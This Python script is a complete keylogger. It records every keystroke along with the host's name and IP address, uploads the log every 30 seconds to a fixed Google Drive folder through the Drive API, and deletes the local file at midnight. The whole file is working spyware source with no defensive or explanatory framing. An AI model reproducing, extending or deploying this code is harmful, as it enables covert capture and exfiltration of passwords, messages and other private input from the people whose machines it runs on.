from pynput import keyboard
import os
import socket
from datetime import datetime
import time
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import threading

# Path to your credentials JSON file
CLIENT_SECRET_FILE = 'client_secret_file.json'
SCOPES = ['https://www.googleapis.com/auth/drive.file']


def authenticate_google_drive():
    """
    Authenticate and create the Google Drive service.

    Returns:
        service: Google Drive service object.
    """
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(CLIENT_SECRET_FILE, SCOPES)
            creds = flow.run_local_server(port=0)
        with open('token.json', 'w') as token:
            token.write(creds.to_json())
    return build('drive', 'v3', credentials=creds)


service = authenticate_google_drive()

# File to be uploaded
now = datetime.now()
formatted_now = now.strftime("%d-%m-%Y")
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
FILE_PATH = f"{hostname}_keylog_{formatted_now}.txt"

# Create the log file if it doesn't exist
if not os.path.exists(FILE_PATH):
    with open(FILE_PATH, "w") as logKey:
        logKey.write(f"Keylogger started at {formatted_now} on {hostname} - {ip_address}\n")

# Google Drive folder ID (optional)
FOLDER_ID = '1D1vF9XycXB6J35HzRQ9qn2nlD4YUnLv9'


def delete_existing_file(file_name, folder_id=None):
    """
    Delete an existing file on Google Drive to prevent duplicates.

    Args:
        file_name (str): Name of the file to delete.
        folder_id (str): ID of the Google Drive folder (optional).
    """
    query = f"name = '{file_name}'"
    if folder_id:
        query += f" and '{folder_id}' in parents"
    results = service.files().list(q=query, spaces='drive', fields='files(id, name)').execute()
    items = results.get('files', [])
    for item in items:
        service.files().delete(fileId=item['id']).execute()
        print(f"Deleted file: {item['name']} (ID: {item['id']})")


def upload_file(file_path, file_name, folder_id=None):
    """
    Upload the file to Google Drive.

    Args:
        file_path (str): Path to the file to upload.
        file_name (str): Name of the file to upload.
        folder_id (str): ID of the Google Drive folder (optional).
    """
    delete_existing_file(file_name, folder_id)
    file_metadata = {'name': file_name}
    if folder_id:
        file_metadata['parents'] = [folder_id]
    media = MediaFileUpload(file_path, mimetype='text/plain')
    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f"Uploaded file ID: {file.get('id')}")


def autosync(file_path, file_name, folder_id=None, interval=60):
    """
    Automatically sync the file to Google Drive if changes are detected.

    Args:
        file_path (str): Path to the file to sync.
        file_name (str): Name of the file to sync.
        folder_id (str): ID of the Google Drive folder (optional).
        interval (int): Interval in seconds between sync checks.
    """
    last_modified = os.path.getmtime(file_path)
    while True:
        current_modified = os.path.getmtime(file_path)
        if current_modified != last_modified:
            print(f"Changes detected in {file_path}. Uploading to Google Drive...")
            upload_file(file_path, file_name, folder_id)
            last_modified = current_modified
        time.sleep(interval)


def keyPressed(key):
    """
    Handle key press events and log them to the file.

    Args:
        key: The key pressed.
    """
    print(str(key))
    with open(FILE_PATH, "a") as logKey:
        try:
            logKey.write(key.char)
        except AttributeError:
            if key == key.space:
                logKey.write(" ")
            elif key == key.enter:
                logKey.write("\n")
            else:
                logKey.write(str(key))
                logKey.write(" ")


def delete_file_at_midnight(file_path):
    """
    Delete the log file at midnight.

    Args:
        file_path (str): Path to the file to delete.
    """
    while True:
        now = datetime.now()
        if now.strftime("%H:%M") == "00:00":
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"{file_path} has been deleted.")
            else:
                print(f"{file_path} does not exist.")
            time.sleep(60)
        time.sleep(1)


def create_newline(file_path):
    """
    Continuously add a newline to the log file every 60 second.

    Args:
        file_path (str): Path to the file to append a newline.
    """
    while True:
        with open(file_path, "a") as logKey:
            logKey.write("\n")
        time.sleep(60)


if __name__ == "__main__":
    # Start the autosync in a separate thread with a 30-second interval (or adjust as needed)
    autosync_thread = threading.Thread(target=autosync, args=(FILE_PATH, FILE_PATH, FOLDER_ID, 30))
    autosync_thread.daemon = True
    autosync_thread.start()

    # Start the file deletion at midnight in a separate thread
    delete_thread = threading.Thread(target=delete_file_at_midnight, args=(FILE_PATH,))
    delete_thread.daemon = True
    delete_thread.start()

    # Start the newline creation in a separate thread
    newline_thread = threading.Thread(target=create_newline, args=(FILE_PATH,))
    newline_thread.daemon = True
    newline_thread.start()

    # Start the keyboard listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()  # Keep the script running
